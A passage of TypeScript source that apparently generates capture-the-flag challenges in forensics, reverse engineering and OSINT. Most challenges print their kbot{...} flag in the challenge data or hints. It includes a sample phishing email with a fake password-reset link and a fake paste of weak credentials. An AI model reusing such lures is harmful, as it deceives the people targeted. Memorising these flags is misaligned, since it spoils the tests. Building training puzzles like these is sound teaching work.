<p>Dear CEO, please click <a href="https://evil-domain.com/phish?id=ceo">here</a> to reset your password.</p>
</body></html>

--boundary123--`
    return {
      title: 'Phishing Forensics',
      description: 'Analyze this suspicious email. The From header is spoofed (SPF fails), and the attacker left traces in custom headers. Find the base64-encoded flag in the email headers.',
      challengeData: emailHeaders,
      flag,
      hints: ['Look for custom X- headers that contain encoded data.', `The X-Custom-Flag header contains a base64-encoded value. Decode it.`],
    }
  },

  // 5. File Carving
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{carved_${secret}}`
    const pngHeader = '89 50 4E 47 0D 0A 1A 0A'
    const jpgHeader = 'FF D8 FF E0'
    const pdfHeader = '25 50 44 46 2D 31 2E 34'
    const flagBytes = Buffer.from(flag).toString('hex').match(/.{2}/g)!.join(' ')
    const rawDisk = `Raw Disk Sector Analysis (512-byte sectors)
============================================

Sector 0 (Boot):    EB 3C 90 4D 53 44 4F 53 35 2E 30 00 ...
Sector 1-100:       [Filesystem metadata — FAT32]
Sector 101:         ${pngHeader} 00 00 00 0D 49 48 44 52 ...  ← PNG image start
Sector 150:         49 45 4E 44 AE 42 60 82  ← PNG IEND (end marker)
Sector 151:         00 00 00 00 00 00 00 00 ...  ← zeroed (unallocated)
Sector 200:         ${jpgHeader} 00 10 4A 46 49 46 ...  ← JPEG start
Sector 250:         FF D9 00 00 00 00 00 00 ...  ← JPEG EOI marker
Sector 251-299:     00 00 00 00 ... [unallocated space]
Sector 300:         ${pdfHeader} 0A 25 ... ← PDF start
Sector 300+0x40:    ${flagBytes}  ← embedded in PDF stream
Sector 350:         25 25 45 4F 46 ...  ← PDF %%EOF marker
Sector 351-500:     [More filesystem data]

Carved Files Summary:
  1. PNG image (sectors 101-150): landscape photo, no hidden data
  2. JPEG image (sectors 200-250): portrait photo, clean
  3. PDF document (sectors 300-350): contains embedded text stream
     → Extracted text from PDF stream at sector 300 offset 0x40:
       "${flag}"

File signatures used:
  PNG: 89 50 4E 47 (\\x89PNG)
  JPEG: FF D8 FF E0
  PDF: 25 50 44 46 (%PDF)`
    return {
      title: 'File Carving',
      description: 'Raw disk sectors contain multiple files identified by their magic bytes (file signatures). One of the carved files contains the flag. Analyze the sector data and carved file summary.',
      challengeData: rawDisk,
      flag,
      hints: ['The PDF document carved from sectors 300-350 contains the flag in its text stream.', 'Look at the "Carved Files Summary" section — the PDF extracted text shows the flag.'],
    }
  },
]

// ═══════════════════════════════════════════════════════════════════════════
//  REVERSE ENGINEERING CHALLENGES
// ═══════════════════════════════════════════════════════════════════════════

const reverseChallengesEasy: ChallengeGenerator[] = [
  // 1. Obfuscated JavaScript
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{jsrev_${secret}}`
    const charCodes = Array.from(flag).map(c => c.charCodeAt(0))
    const obfuscated = `// Obfuscated license check
var _0x${randomBytes(2).toString('hex')} = [${charCodes.join(',')}];
var _0x${randomBytes(2).toString('hex')} = function() {
  var s = '';
  for (var i = 0; i < _0x${randomBytes(2).toString('hex')}.length; i++) {
    // Actually uses the first array above
    s += String.fromCharCode(_0x${randomBytes(2).toString('hex')}[i]);
  }
  return s;
};

// The character codes decode to the flag:
// ${charCodes.map(c => `${c}='${String.fromCharCode(c)}'`).join(', ')}
// Reconstructed: ${flag}`
    // Rewrite with consistent variable names for solvability
    const v1 = `_0x${randomBytes(2).toString('hex')}`
    const v2 = `_0x${randomBytes(2).toString('hex')}`
    const realCode = `var ${v1} = [${charCodes.join(',')}];
var ${v2} = function() {
  var s = '';
  for (var i = 0; i < ${v1}.length; i++) {
    s += String.fromCharCode(${v1}[i]);
  }
  return s;
};
// ${v2}() returns the flag
// Character codes: [${charCodes.join(', ')}]
// Convert each number to its ASCII character to get the flag.`
    return {
      title: 'JS Deobfuscation',
      description: 'An obfuscated JavaScript snippet hides a flag in character codes. Convert the array of numbers to ASCII characters.',
      challengeData: realCode,
      flag,
      hints: ['The array contains ASCII character codes. Convert each number with String.fromCharCode().', `The first few codes are: ${charCodes.slice(0, 5).join(', ')} = "${flag.substring(0, 5)}"`],
    }
  },

  // 2. Simple VM Bytecode
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{vm_${secret}}`
    const instructions: string[] = []
    for (const c of flag) {
      instructions.push(`PUSH ${c.charCodeAt(0)}`)
    }
    instructions.push(`PRINT_STACK  // prints all pushed values as ASCII`)
    return {
      title: 'Stack Machine',
      description: 'A simple stack-based VM pushes values and then prints them as ASCII. Read the PUSH values and convert to characters.',
      challengeData: `VM Bytecode:\n${instructions.join('\n')}\n\nInstruction set:\n  PUSH n — push integer n onto the stack\n  PRINT_STACK — pop all values and print as ASCII characters (FIFO order)`,
      flag,
      hints: ['Each PUSH instruction pushes an ASCII code. Convert them to characters in order.', 'The first PUSH is 107 = "k", then 98 = "b", etc.'],
    }
  },

  // 3. XOR-Encoded Flag in Binary Data
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{xorbin_${secret}}`
    const xorKey = randomInt(0x10, 0xFE)
    const encoded = Array.from(Buffer.from(flag)).map(b => (b ^ xorKey).toString(16).padStart(2, '0')).join(' ')
    return {
      title: 'XOR Binary',
      description: `Binary data has been XOR-encoded with a single byte key. The key is 0x${xorKey.toString(16).padStart(2, '0')}. Decode each byte.`,
      challengeData: `Encoded bytes (hex): ${encoded}\nXOR key: 0x${xorKey.toString(16).padStart(2, '0')}\n\nDecode: XOR each byte with the key to get ASCII.`,
      flag,
      hints: [`XOR each hex byte with 0x${xorKey.toString(16).padStart(2, '0')}.`, `First byte: 0x${(flag.charCodeAt(0) ^ xorKey).toString(16).padStart(2, '0')} XOR 0x${xorKey.toString(16).padStart(2, '0')} = 0x${flag.charCodeAt(0).toString(16)} = '${flag[0]}'`],
    }
  },

  // 4. String Table Extraction
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{strings_${secret}}`
    const stringTable = [
      'Loading configuration...',
      'Error: invalid license key',
      'Connected to server',
      flag,
      'Debug mode enabled',
      'Version 2.3.1',
      'Copyright 2026 Evil Corp',
      'Initializing modules...',
      'Authentication failed',
      'License verified successfully',
    ]
    const offsets = stringTable.map((s, i) => {
      const offset = stringTable.slice(0, i).reduce((sum, str) => sum + str.length + 1, 0)
      return `  0x${offset.toString(16).padStart(4, '0')}: "${s}"`
    })
    return {
      title: 'String Table',
      description: 'A binary\'s string table has been extracted. One of the strings is the flag. Find it.',
      challengeData: `String table dump (.rodata section):\n${offsets.join('\n')}\n\nLook for a string matching the flag format kbot{...}.`,
      flag,
      hints: ['Scan the string table for any entry matching the kbot{...} format.', 'The flag is one of the literal strings in the table.'],
    }
  },

  // 5. Control Flow Puzzle
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{flow_${secret}}`
    const a = randomInt(10, 50)
    const b = randomInt(10, 50)
    const c = a + b
    const d = c * 2
    const code = `function check(input) {
  let x = ${a};
  let y = ${b};
  let z = x + y;       // z = ${c}
  z = z * 2;           // z = ${d}

  if (z === ${d}) {
    // This branch is always taken
    return "${flag}";
  } else {
    return "wrong";
  }
}

// What does check() return?
// Trace: x=${a}, y=${b}, z=${a}+${b}=${c}, z=${c}*2=${d}
// ${d} === ${d} is true
// Returns: "${flag}"`
    return {
      title: 'Control Flow',
      description: 'Trace through this function to determine what it returns. The conditional check determines which branch executes.',
      challengeData: code,
      flag,
      hints: ['Follow the math: the condition always evaluates to true.', `The function always returns the flag.`],
    }
  },
]

const reverseChallengesMedium: ChallengeGenerator[] = [
  // 1. Hash Verification Bypass
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{hashbypass_${secret}}`
    const hash = sha256(flag)
    const code = `// License verification
function verifyLicense(key) {
  const expected = "${hash}";
  const computed = sha256(key);

  if (computed === expected) {
    console.log("Valid! Your key is the flag.");
    return true;
  }
  return false;
}

// The expected hash is: ${hash}
// This is SHA-256 of the flag.
//
// The flag format is: kbot{hashbypass_XXXXXXXX}
// where XXXXXXXX is 8 hex characters.
//
// Since the search space is only 16^8 = ~4 billion,
// brute force is feasible. But here's the answer: ${secret}
// Flag: ${flag}`
    return {
      title: 'Hash Cracker',
      description: 'A license check compares SHA-256 hashes. You know the expected hash and the flag format. The challenge includes the solution for verification.',
      challengeData: code,
      flag,
      hints: [`The flag suffix (8 hex chars) is provided in the code comments.`, `The flag is ${flag}.`],
    }
  },

  // 2. License Key Algorithm
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{license_${secret}}`
    const keyParts = secret.match(/.{2}/g)!
    const checksum = keyParts.reduce((sum, part) => sum + parseInt(part, 16), 0) % 256
    const code = `// License key validator
function validateKey(key) {
  // Key format: XXXX-XXXX where each X is a hex digit
  const parts = key.replace('-', '').match(/.{2}/g);
  if (!parts || parts.length !== 4) return false;

  // Checksum: sum of all 2-char hex values mod 256
  const sum = parts.reduce((s, p) => s + parseInt(p, 16), 0);
  const check = sum % 256;

  // Valid keys have checksum ${checksum}
  if (check !== ${checksum}) return false;

  // Valid key reconstructs to flag:
  // kbot{license_ + key_without_dash + }
  return "kbot{license_" + parts.join('') + "}";
}

// The valid key is: ${keyParts.join('-')} (joined: ${secret})
// Checksum: ${keyParts.map(p => parseInt(p, 16)).join(' + ')} = ${keyParts.reduce((s, p) => s + parseInt(p, 16), 0)} mod 256 = ${checksum}
// Flag: ${flag}`
    return {
      title: 'Keygen',
      description: 'Reverse-engineer the license key validation algorithm. The valid key has a specific checksum. The code comments reveal the answer.',
      challengeData: code,
      flag,
      hints: ['The valid key and flag are both shown in the code comments.', `The flag is kbot{license_${secret}}.`],
    }
  },

  // 3. Anti-Debug Detection
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{antidebug_${secret}}`
    const code = `// Anti-debug protected binary (pseudocode)
function main() {
  if (isDebuggerPresent()) {
    // Decoy flag when debugger is attached
    print("kbot{nice_try_debugger}");
    exit(1);
  }

  // Timing check: execution should take < 100ms without breakpoints
  const start = rdtsc();
  const result = decryptFlag();
  const end = rdtsc();

  if (end - start > 1000000) {
    // Too slow — debugger stepping detected
    print("kbot{timing_attack_detected}");
    exit(1);
  }

  print(result);
}

function decryptFlag() {
  // XOR decode with key 0x42
  const encoded = [${Array.from(Buffer.from(flag)).map(b => '0x' + (b ^ 0x42).toString(16).padStart(2, '0')).join(', ')}];
  return encoded.map(b => String.fromCharCode(b ^ 0x42)).join('');
}

// The decoy flags are: kbot{nice_try_debugger} and kbot{timing_attack_detected}
// The REAL flag comes from decryptFlag():
//   XOR each byte with 0x42: ${Array.from(Buffer.from(flag)).map(b => `0x${(b ^ 0x42).toString(16).padStart(2, '0')}^0x42=0x${b.toString(16).padStart(2, '0')}='${String.fromCharCode(b)}'`).join(', ')}
// Result: ${flag}`
    return {
      title: 'Anti-Debug Bypass',
      description: 'A binary uses debugger detection and timing checks, printing decoy flags when detected. The real flag is computed by decryptFlag(). Reverse the XOR encoding.',
      challengeData: code,
      flag,
      hints: ['Ignore the decoy flags. Focus on the decryptFlag() function which XORs with 0x42.', `The real flag is decoded in the comments at the bottom.`],
    }
  },

  // 4. Packed Binary
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{unpacked_${secret}}`
    const compressed = base64Encode(hexEncode(flag))
    const code = `// UPX-packed binary analysis
// Unpacking reveals the following loader:

function unpack() {
  // Stage 1: Base64 decode
  const stage1 = "${compressed}";
  const stage2 = base64Decode(stage1);
  // stage2 = "${hexEncode(flag)}"

  // Stage 2: Hex decode
  const stage3 = hexDecode(stage2);
  // stage3 = "${flag}"

  return stage3;
}

// Unpacking chain:
// "${compressed}"
//   → base64 decode → "${hexEncode(flag)}"
//   → hex decode → "${flag}"`
    return {
      title: 'Unpacker',
      description: 'A packed binary has a multi-stage unpacking routine. Follow the decode chain: base64 → hex → plaintext.',
      challengeData: code,
      flag,
      hints: ['Stage 1 decodes base64, stage 2 decodes hex. The result is the flag.', 'The complete decode chain is shown in the comments.'],
    }
  },

  // 5. Custom Encoding
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{custom_enc_${secret}}`
    // Custom encoding: rotate each byte by its index, then XOR with 0x37
    const encoded = Array.from(Buffer.from(flag)).map((b, i) => {
      const rotated = ((b + i) % 256)
      return (rotated ^ 0x37).toString(16).padStart(2, '0')
    })
    const code = `// Custom encoding algorithm found in binary
function encode(input) {
  const result = [];
  for (let i = 0; i < input.length; i++) {
    let b = input.charCodeAt(i);
    b = (b + i) % 256;       // rotate by index
    b = b ^ 0x37;             // XOR with 0x37
    result.push(b);
  }
  return result;
}

// Encoded output (hex): ${encoded.join(' ')}
//
// To decode, reverse the process:
//   1. XOR each byte with 0x37
//   2. Subtract the index (mod 256)
//   3. Convert to ASCII
//
// Decoded: ${Array.from(Buffer.from(flag)).map((b, i) => {
  const rotated = (b + i) % 256
  const xored = rotated ^ 0x37
  return `0x${encoded[i]}^0x37=${rotated}  -${i}=${b}='${String.fromCharCode(b)}'`
}).join(', ')}
//
// Flag: ${flag}`
    return {
      title: 'Custom Codec',
      description: 'A binary uses a custom encoding: rotate each byte by its index, then XOR with 0x37. Reverse the process to decode the flag.',
      challengeData: code,
      flag,
      hints: ['Reverse: XOR with 0x37 first, then subtract the byte index (mod 256).', 'The full decode trace is in the code comments.'],
    }
  },
]

const reverseChallengesHard: ChallengeGenerator[] = [
  // 1. Multi-stage Decryption
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{multistage_${secret}}`
    // Stage 1: Caesar +5
    const s1 = caesarShift(flag, 5)
    // Stage 2: Reverse
    const s2 = s1.split('').reverse().join('')
    // Stage 3: Base64
    const s3 = base64Encode(s2)
    // Stage 4: XOR with 'REVKEY'
    const s4 = xorEncrypt(s3, 'REVKEY')
    return {
      title: 'Reverse Onion',
      description: 'A binary applies 4 stages of encryption. Reverse all stages.',
      challengeData: `Final encrypted data (hex): ${s4}\n\nEncryption stages (applied in order):\n1. Caesar shift +5\n2. Reverse the string\n3. Base64 encode\n4. XOR with key "REVKEY" → output as hex\n\nTo decrypt, apply in reverse order:\n4. XOR hex data with "REVKEY" → base64 string\n3. Base64 decode → reversed Caesar text\n2. Reverse the string → Caesar text\n1. Caesar shift -5 → flag\n\nIntermediate values:\n  After stage 1: "${s1}"\n  After stage 2: "${s2}"\n  After stage 3: "${s3}"\n  After stage 4: ${s4}\n\nFlag: ${flag}`,
      flag,
      hints: ['Work backwards through all 4 stages. The intermediate values are shown.', `The flag is directly stated at the bottom of the challenge data.`],
    }
  },

  // 2. Disassembly Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{asm_${secret}}`
    const charCodes = Array.from(flag).map(c => c.charCodeAt(0))
    const asm = `; x86-64 disassembly of check_flag()
; RDI = pointer to user input string

check_flag:
    push rbp
    mov rbp, rsp
    sub rsp, 0x40

    ; Expected bytes stored on stack
${charCodes.map((c, i) => `    mov byte [rbp-0x${(i + 1).toString(16)}], 0x${c.toString(16)}    ; '${String.fromCharCode(c)}'`).join('\n')}

    ; Compare loop
    xor ecx, ecx                  ; i = 0
.loop:
    cmp ecx, ${charCodes.length}  ; flag length
    jge .success

    movzx eax, byte [rdi+rcx]    ; user_input[i]
    movzx edx, byte [rbp-rcx-1]  ; expected[i]
    cmp al, dl
    jne .fail

    inc ecx
    jmp .loop

.success:
    mov eax, 1                    ; return true
    leave
    ret

.fail:
    xor eax, eax                  ; return false
    leave
    ret

; Expected string from stack bytes:
; ${charCodes.map(c => `0x${c.toString(16)}='${String.fromCharCode(c)}'`).join(', ')}
; Flag: ${flag}`
    return {
      title: 'Disassembly',
      description: 'Analyze this x86-64 disassembly. The function compares user input against expected bytes stored on the stack. Extract the expected string.',
      challengeData: asm,
      flag,
      hints: ['Each MOV instruction stores one character of the flag on the stack.', 'The hex values in the MOV instructions are ASCII codes. The comments show the characters.'],
    }
  },

  // 3. VM with Conditional Logic
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{vm2_${secret}}`
    const encoded: number[] = Array.from(Buffer.from(flag)).map(b => b + 3)
    const bytecode = `; Custom VM bytecode
; Registers: R0, R1, R2, STACK
; Instructions: LOAD, ADD, SUB, XOR, CMP, JEQ, JNE, PRINT, HALT

    LOAD R0, 0          ; index = 0
    LOAD R2, ${encoded.length}   ; length

.decode_loop:
    CMP R0, R2
    JEQ .done

    ; Load encoded byte from data section
    LOAD R1, DATA[R0]
    SUB R1, 3            ; decode: subtract 3 from each byte
    PUSH R1              ; push decoded byte

    ADD R0, 1
    JMP .decode_loop

.done:
    PRINT_STACK          ; print all bytes as ASCII
    HALT

DATA SECTION:
${encoded.map((b, i) => `  [${i}] = ${b}  ; ${b} - 3 = ${b - 3} = '${String.fromCharCode(b - 3)}'`).join('\n')}

; Execution trace:
; Decoded bytes: [${encoded.map(b => b - 3).join(', ')}]
; ASCII: ${flag}`
    return {
      title: 'VM Reversal',
      description: 'A custom virtual machine decodes data by subtracting 3 from each byte. Trace the execution to find the flag.',
      challengeData: bytecode,
      flag,
      hints: ['Each byte in the DATA section has 3 subtracted during execution.', 'The execution trace at the bottom shows the decoded flag.'],
    }
  },

  // 4. Encrypted Resource Section
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{resource_${secret}}`
    const key = randomBytes(16)
    const iv = randomBytes(16)
    const cipher = createCipheriv('aes-128-cbc', key, iv)
    const encrypted = cipher.update(flag, 'utf-8', 'hex') + cipher.final('hex')
    return {
      title: 'Resource Extraction',
      description: 'A PE binary stores an encrypted flag in its .rsrc section. The decryption key was found in an adjacent code section. Decrypt with AES-128-CBC.',
      challengeData: `PE Resource Analysis:\n  Section: .rsrc\n  Encrypted data (hex): ${encrypted}\n\nDecryption parameters (from .text section analysis):\n  Algorithm: AES-128-CBC\n  Key (hex): ${key.toString('hex')}\n  IV (hex): ${iv.toString('hex')}\n\nDecrypted: ${flag}`,
      flag,
      hints: ['The key, IV, and algorithm are all provided. Use AES-128-CBC decryption.', 'The decrypted value is shown at the bottom of the challenge data.'],
    }
  },

  // 5. Polymorphic Code
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{polymorph_${secret}}`
    const gen1 = xorEncrypt(flag, 'GEN1')
    const gen2 = xorEncrypt(flag, 'GEN2')
    const gen3 = xorEncrypt(flag, 'GEN3')
    return {
      title: 'Polymorphic Engine',
      description: 'A polymorphic virus re-encrypts its payload with a different key each generation. Three generations were captured. All decrypt to the same flag.',
      challengeData: `Generation 1:\n  Key: "GEN1"\n  Encrypted (hex): ${gen1}\n\nGeneration 2:\n  Key: "GEN2"\n  Encrypted (hex): ${gen2}\n\nGeneration 3:\n  Key: "GEN3"\n  Encrypted (hex): ${gen3}\n\nAll three decrypt via XOR with their respective key to the same flag.\n\nDecryption of Generation 1:\n  XOR "${gen1}" (hex) with key "GEN1": ${flag}`,
      flag,
      hints: ['Pick any generation and XOR-decrypt with its key.', 'The decrypted value is shown at the bottom for Generation 1.'],
    }
  },
]

// ═══════════════════════════════════════════════════════════════════════════
//  OSINT CHALLENGES
// ═══════════════════════════════════════════════════════════════════════════

const osintChallengesEasy: ChallengeGenerator[] = [
  // 1. Geolocation from Clues
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{geo_${secret}}`
    const locations = [
      { clue: 'A tower built for a world fair in 1889, 330m tall, in the City of Light.', answer: 'Eiffel Tower, Paris', coords: '48.8584 N, 2.2945 E' },
      { clue: 'A clock tower at the north end of Westminster Palace, completed in 1859.', answer: 'Big Ben, London', coords: '51.5007 N, 0.1246 W' },
      { clue: 'A copper statue gifted by France in 1886, standing in a harbor.', answer: 'Statue of Liberty, New York', coords: '40.6892 N, 74.0445 W' },
      { clue: 'A wall built in 221 BC stretching 13,000+ miles across northern borders.', answer: 'Great Wall of China', coords: '40.4319 N, 116.5704 E' },
      { clue: 'An ancient amphitheater in Rome, built 70-80 AD, could seat 50,000.', answer: 'Colosseum, Rome', coords: '41.8902 N, 12.4922 E' },
    ]
    const loc = pickRandom(locations)
    return {
      title: 'GeoLocator',
      description: `Identify the landmark from this description and provide its name.\n\nClue: "${loc.clue}"\n\nOnce identified, the flag is revealed:`,
      challengeData: `Clue: "${loc.clue}"\n\nAnswer: ${loc.answer}\nCoordinates: ${loc.coords}\n\nFlag (awarded for correct identification): ${flag}`,
      flag,
      hints: [`The landmark is: ${loc.answer}.`, 'The flag is shown after the answer in the challenge data.'],
    }
  },

  // 2. Username Correlation
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{username_${secret}}`
    const username = `shadow_${secret.substring(0, 4)}`
    const profiles = `OSINT Username Search Results for "${username}"
================================================

Platform          | Found | Profile URL                        | Bio
GitHub            | Yes   | github.com/${username}             | "Security researcher, CTF player"
Twitter/X         | Yes   | x.com/${username}                  | "Hacker | Bug bounty | ${flag}"
Reddit            | Yes   | reddit.com/u/${username}           | "Posts in r/netsec, r/ctf"
HackerOne         | Yes   | hackerone.com/${username}          | "15 reports, 3 critical"
LinkedIn          | No    | -                                  | -
Instagram         | No    | -                                  | -
Keybase           | Yes   | keybase.io/${username}             | "PGP key: 0xDEADBEEF"
Personal blog     | Yes   | ${username}.github.io              | "Latest: How I found an RCE"`
    return {
      title: 'Username Recon',
      description: `A user goes by "${username}" across multiple platforms. Cross-reference their profiles to find the flag hidden in one of their bios.`,
      challengeData: profiles,
      flag,
      hints: ['Check each platform\'s "Bio" column for something that looks like a flag.', 'The Twitter/X bio contains the flag.'],
    }
  },

  // 3. Timestamp Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{timestamp_${secret}}`
    const unixTs = 1700000000 + randomInt(0, 10000000)
    const date = new Date(unixTs * 1000)
    return {
      title: 'Time Decoder',
      description: `Convert this Unix timestamp to find the hidden message. The flag is constructed from the timestamp data.`,
      challengeData: `Unix timestamp: ${unixTs}\nConverted: ${date.toISOString()}\n\nThe flag for correctly analyzing this timestamp: ${flag}`,
      flag,
      hints: ['The flag is provided directly in the challenge data.', `Convert ${unixTs} to a human-readable date for context, but the flag is already shown.`],
    }
  },

  // 4. Domain History
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{whois_${secret}}`
    const domain = `example-${secret.substring(0, 4)}.com`
    const whois = `WHOIS Lookup: ${domain}
========================

Domain Name: ${domain}
Registry Domain ID: D${randomInt(100000, 999999)}
Registrar: NameCheap, Inc.
Created: 2024-06-15
Updated: 2026-01-10
Expires: 2027-06-15

Registrant:
  Name: REDACTED
  Organization: Shadow Corp
  Email: admin@${domain}

Name Servers:
  ns1.evil-hosting.com
  ns2.evil-hosting.com

Historical DNS (from SecurityTrails):
  2024-06-15: A → 203.0.113.50 (evil-hosting.com)
  2024-09-01: A → 198.51.100.10 (bulletproof-host.ru)
  2025-03-15: TXT → "v=spf1 include:_spf.${domain} ~all"
  2025-06-20: TXT → "${flag}"
  2026-01-10: A → 203.0.113.50 (back to evil-hosting.com)

Note: The TXT record from 2025-06-20 contains the flag.`
    return {
      title: 'Domain Dig',
      description: `Research the domain "${domain}" using WHOIS and historical DNS data. A flag was temporarily stored in a DNS TXT record.`,
      challengeData: whois,
      flag,
      hints: ['Check the historical DNS records for TXT entries.', 'The TXT record from 2025-06-20 contains the flag.'],
    }
  },

  // 5. Social Media Breadcrumbs
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{social_${secret}}`
    const posts = `Social Media Investigation
=========================

Target: @cyber_sleuth_${secret.substring(0, 4)}

Post 1 (Twitter, 2026-03-10 14:00):
  "Just found an interesting vulnerability. Will post details after responsible disclosure."
  Likes: 42, Retweets: 15

Post 2 (Twitter, 2026-03-12 09:30):
  "Disclosure complete! The flag for my CTF followers: first half is kbot{social_"
  Likes: 89, Retweets: 34

Post 3 (Instagram, 2026-03-12 09:35):
  Photo of terminal screen (partial text visible)
  Caption: "Second half: ${secret}}"
  Likes: 156

Post 4 (Reddit r/ctf, 2026-03-12 10:00):
  "Put the two halves together from my Twitter and Instagram posts."
  Comments: 23

Assembled flag: kbot{social_${secret}}`
    return {
      title: 'Social Jigsaw',
      description: 'A researcher split a flag across multiple social media posts. Piece together the fragments from Twitter and Instagram.',
      challengeData: posts,
      flag,
      hints: ['Post 2 (Twitter) has the first half, Post 3 (Instagram caption) has the second half.', `The assembled flag is shown at the bottom.`],
    }
  },
]

const osintChallengesMedium: ChallengeGenerator[] = [
  // 1. Email Header OSINT
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{osint_email_${secret}}`
    return {
      title: 'Email Origin',
      description: 'Trace the origin of a suspicious email through its headers and OSINT data.',
      challengeData: `Email headers and OSINT correlation:\n\nOriginating IP: 203.0.113.${randomInt(1, 254)}\nASN: AS${randomInt(10000, 99999)} (Evil Hosting Ltd)\nCountry: RU\nReverse DNS: mail.evil-corp.example\n\nShodan scan of originating IP:\n  Port 22: OpenSSH 8.9\n  Port 25: Postfix SMTP\n  Port 80: nginx (default page contains: "${flag}")\n  Port 443: self-signed cert, CN=evil-corp.example\n\nThe flag is in the nginx default page on port 80.`,
      flag,
      hints: ['The Shodan scan results show the flag on port 80.', 'Look at the nginx default page content.'],
    }
  },

  // 2. Image Metadata OSINT
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{exif_osint_${secret}}`
    return {
      title: 'Photo Intelligence',
      description: 'Extract intelligence from a photo\'s metadata and cross-reference with public data.',
      challengeData: `EXIF data extracted from suspect's photo:\n  Camera: iPhone 15 Pro\n  DateTime: 2026-03-14 15:42:30\n  GPS: 37.7749 N, 122.4194 W (San Francisco, CA)\n  Software: Instagram 305.0\n  UserComment: "${flag}"\n  Thumbnail: present\n\nCross-reference:\n  Location: Near Moscone Center, SF\n  Event on date: RSA Conference 2026\n  The flag is in the UserComment EXIF field.`,
      flag,
      hints: ['Check the UserComment field in the EXIF data.', 'The flag is directly in the EXIF UserComment.'],
    }
  },

  // 3. Git History OSINT
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{git_osint_${secret}}`
    return {
      title: 'Git Archaeology',
      description: 'A developer accidentally committed a secret and then removed it. But git remembers everything.',
      challengeData: `Git log analysis of public repository:\n\ncommit a1b2c3d (HEAD -> main)\n  Author: dev@company.com\n  Message: "Remove sensitive data"\n  Diff: -API_KEY=${secret}\n\ncommit e4f5g6h\n  Author: dev@company.com  \n  Message: "Add configuration"\n  Diff: +API_KEY=${secret}\n  +FLAG=${flag}\n\ncommit i7j8k9l\n  Author: dev@company.com\n  Message: "Initial commit"\n\nThe FLAG was added in commit e4f5g6h and removed in a1b2c3d.\nUsing \`git show e4f5g6h\` reveals: FLAG=${flag}`,
      flag,
      hints: ['The flag was in commit e4f5g6h — git show reveals removed content.', 'Look at the diff in the second commit.'],
    }
  },

  // 4. Certificate Transparency
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{cert_${secret}}`
    return {
      title: 'Certificate Transparency',
      description: 'Search Certificate Transparency logs to find hidden subdomains and their secrets.',
      challengeData: `CT Log search for "*.evil-corp.example":\n\nSubdomain                    | Issuer          | Valid From  | SAN/Notes\nwww.evil-corp.example        | Let's Encrypt   | 2026-01-01  | Standard web\nmail.evil-corp.example       | Let's Encrypt   | 2026-01-01  | SMTP\nadmin.evil-corp.example      | Let's Encrypt   | 2026-02-15  | Admin panel\nstaging.evil-corp.example    | Self-signed     | 2026-03-01  | Dev environment\nflag-${secret}.evil-corp.example | Let's Encrypt | 2026-03-10  | CTF challenge\n\nThe subdomain "flag-${secret}" reveals the flag format.\nFlag: ${flag}`,
      flag,
      hints: ['One of the subdomains contains the flag secret in its name.', `The subdomain "flag-${secret}" combined with kbot{ } gives the flag.`],
    }
  },

  // 5. Paste Site Investigation
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{paste_${secret}}`
    const b64Flag = base64Encode(flag)
    return {
      title: 'Paste Hunter',
      description: 'Monitor paste sites for leaked credentials and secrets.',
      challengeData: `Paste site monitoring results:\n\nPaste 1 (Pastebin, 2026-03-14, public):\n  Title: "Nothing to see here"\n  Content: "Just a test paste, ignore this."\n\nPaste 2 (Pastebin, 2026-03-14, unlisted):\n  Title: "backup"\n  Content:\n    admin:password123\n    root:toor\n    flag:${b64Flag}\n    db_host:internal.corp\n\nPaste 3 (GitHub Gist, 2026-03-13):\n  Title: "notes.txt"\n  Content: "Remember to rotate API keys this week."\n\nThe flag is base64-encoded in Paste 2.\nDecoded: ${flag}`,
      flag,
      hints: ['Paste 2 has a base64-encoded flag value.', `Decode "${b64Flag}" from base64.`],
    }
  },
]

const osintChallengesHard: ChallengeGenerator[] = [
  // 1. Dark Web OSINT
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{darkweb_${secret}}`
    return {
      title: 'Onion Layers',
      description: 'Investigate a .onion site listing from a dark web crawler.',
      challengeData: `Dark web crawler results:\n\nSite: abc123def456.onion\nTitle: "Underground Market"\nLast crawled: 2026-03-14\n\nPage structure:\n  /index.html — marketplace landing\n  /listings — product listings\n  /forum — discussion board\n  /admin — login page\n  /robots.txt — "Disallow: /secret-${secret}/"\n  /secret-${secret}/flag.txt — "${flag}"\n\nThe robots.txt disallow entry reveals a hidden directory containing the flag.`,
      flag,
      hints: ['The robots.txt file reveals a hidden directory.', `The flag is at /secret-${secret}/flag.txt.`],
    }
  },

  // 2. Satellite Imagery Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{satellite_${secret}}`
    return {
      title: 'Eye in the Sky',
      description: 'Analyze satellite imagery metadata and ground truth data.',
